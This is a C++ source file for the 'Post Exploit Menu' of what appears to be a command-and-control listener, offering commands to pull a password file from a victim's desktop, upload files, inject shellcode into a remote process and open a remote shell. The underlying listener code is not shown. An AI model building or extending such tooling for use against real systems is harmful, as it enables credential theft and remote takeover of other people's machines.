#include "menus.h"
#include <iostream>
#include <stdio.h> 
#include <unistd.h> 
#include <string>
#include <cstring>
#include "listener.h"

using namespace std;

void postExploitMenu(listener *newL) {
	printf("<---This is the Post Exploit Menu--->\n");

	string cmd;
	while(true){
		cout<<"ShellNo:Listener->";
		getline(cin,cmd);
		if(!cmd.compare("download")){
			printf("You Selected Download\n");
			newL->downloadFile("C:\\Users\\john\\Desktop\\password.txt", "pwd_download.txt");
		}
		if (!cmd.compare("upload")){
			printf("You Selected Upload\n");
			newL->uploadFile("upload.txt", "C:\\\\test\\\\upload.txt");
		}
		if(!cmd.compare("inject-shellcode")){
			printf("You Selected Shell\n");
			newL->injectShellcode("shellcode.bin");
		}
		if(!cmd.compare("shell")){
			printf("You selected drop into shell\n");
			newL->dropIntoShell();
		}
		if(!cmd.compare("exit")){
			printf("Exiting!\n");
			break;
		}
		if(!cmd.compare("help")) {
			printf("HELP MENU\n");
			printf("download <remote file> <local file>: download remote file to local file\n");
			printf("upload <local file> <remote file>: upload local file to remote location\n");
			printf("inject-shellcode <shellcode.bin>: inject given shellcode into remote process\n");
			printf("exit: exit listener menu (does not kill session)\n");
		}
	}
}

